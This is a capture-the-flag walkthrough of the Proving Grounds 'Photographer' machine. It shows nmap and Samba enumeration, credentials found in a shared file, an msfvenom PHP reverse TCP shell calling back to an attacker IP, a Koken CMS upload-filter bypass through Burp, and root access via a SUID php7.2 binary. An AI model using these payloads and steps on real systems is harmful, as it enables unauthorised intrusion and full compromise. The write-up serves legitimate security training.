- browsed on a browser, gets webpage confirming its a webserver
- checked robots.txt, source code, not found
- Did a service enumeration
```
nmap -sV 192.168.108.76
```

```
- service ports enumeration Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Two **http** ports found, browsed to **port 8000** and found a Koken admin login
- Also samba services were also found to be running.
### Exploiting samba
- https://docs.centrify.com/Content/zint-samba/ConfigurationUNIXAccess.htm
- https://medium.com/@nmappn/exploiting-smb-samba-without-metasploit-series-1-b34291bbfd63
- connecting to a samba client:
	smbclient -k -L hostname (list info abou samba and smbclient)

-  Use SMB CLient to check for anonymous access
		-N -- no pass
		-L -- list

```
	WORKGROUP            PHOTOGRAPHER
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbclient -N -L //192.168.108.76

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            PHOTOGRAPHER
```

- Check workgroups you can access without passwd:
		-H --host
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbmap -H 192.168.108.76
[+] Guest session   	IP: 192.168.108.76:445	Name: 192.168.108.76                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	sambashare                                        	READ ONLY	Samba on Ubuntu
	IPC$                                              	NO ACCESS	IPC Service (photographer server (Samba, Ubuntu))
```
- We have read access to sambashare, so accesss it through smbclient:
	```
	smbclient -N //192.168.108.76/sambashare
	```
- Output
```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ smbclient -N //192.168.108.76/sambashare
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 20 18:51:08 2020
  ..                                  D        0  Thu Aug 20 19:08:59 2020
  mailsent.txt                        N      503  Tue Jul 21 04:29:40 2020
  wordpress.bkp.zip                   N 13930308  Tue Jul 21 04:22:23 2020

		3300080 blocks of size 1024. 2958792 blocks available
smb: \> more mailsent.txt
getting file \mailsent.txt of size 503 as /tmp/smbmore.QPUKEq (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> nc
nc: command not found
smb: \> zip
zip: command not found
smb: \> unzip
unzip: command not found
smb: \> get mailsent.txt
getting file \mailsent.txt of size 503 as mailsent.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> get wordpress.bkp.zip
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \> getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now
```

- Dowload the two files using:
get [local-file-name]  -	Copy the file called remote-file-name from the server to the machine running the client. If specified, name the local copy local-file-name. Note that all transfers in smbclient are binary. See also the lowercase command
i.e.
```
get mailsent.txt
```


```
cat mailsent.txt
```

```
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$ more mailsent.txt
Message-ID: <4129F3CA.2020509@dc.edu>
Date: Mon, 20 Jul 2020 11:40:36 -0400
From: Agi Clarence <agi@photographer.com>
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Transfer-Encoding: 7bit

Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
festus@boynamedboy:~/Desktop/CTF/Proving Grounds$
```

- We have the email of the one who's website was built: **daisa@photographer.com** while the password from mailsent.txt
as **babygirl**

- Create a php reverse tcp shell with msfvenom:
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.49.156 LPORT=4445 -f raw -o shell.php
```
- Rename **image.php** to **image.php.jpg** to trick the UI into uploading the shell

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.49.156
set LPORT 4445
exploit

```

- On Koken cms dashboard, import the image.
- Intercept, request via burp and rename the uploading file from **image.php.jpg** to **image.php**, then upload the file.
- On Koken cms library, select the file and put the mouse on "Download File" to see where file is hosted on server

- Once uploaded, visit the site from user side and click on timeline to check recently uploaded images,
then finally check in msfvenom if a session was created.
- If done correctly, a session was created, type shell to gain a shell;

```
meterpreter>
meterpreter>shell
```
- system runs python3, so we can spawn a shell:
```
meterpreter>shell
ls
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$
```
- We can finally exploit it:
```
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls
ls
image.php
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home/daima
<www/html/koken/storage/originals/69/fa$ ls /home/daima                      
ls: cannot access '/home/daima': No such file or directory
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cd
cd
bash: cd: HOME not set
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home
ls /home
agi  daisa  lost+found
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ ls /home/daisa
<www/html/koken/storage/originals/69/fa$ ls /home/daisa                      
Desktop    Downloads  Pictures	Templates  examples.desktop  user.txt
Documents  Music      Public	Videos	   local.txt
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cat /home/daisa/user.txt
<www/html/koken/storage/originals/69/fa$ cat /home/daisa/user.txt            
This is not the flag you're looking for...
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ cat /home/daisa/local.txt
<www/html/koken/storage/originals/69/fa$ cat /home/daisa/local.txt           
58b12beadc9f84725fa834bfaf8b029b
```
- Trying to view home directory pops nothing, so we check for files with suid bits set and we find php7.2 is among them from which we use it to priv escalate
```
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```
- We then use php7.2 to priv escalate:
```
www-data@photographer:/var/www/html/koken/storage/originals/69/fa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
<ginals/69/fa$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"         
bash-4.3# whoami
whoami
root
bash-4.3# whoami
whoami
root
bash-4.3# ls /root
ls /root
proof.txt
bash-4.3# cat /root/proof.txt
cat /root/proof.txt
0ecf43ae4a8d2bf476944a10cac070ee
bash-4.3#
```
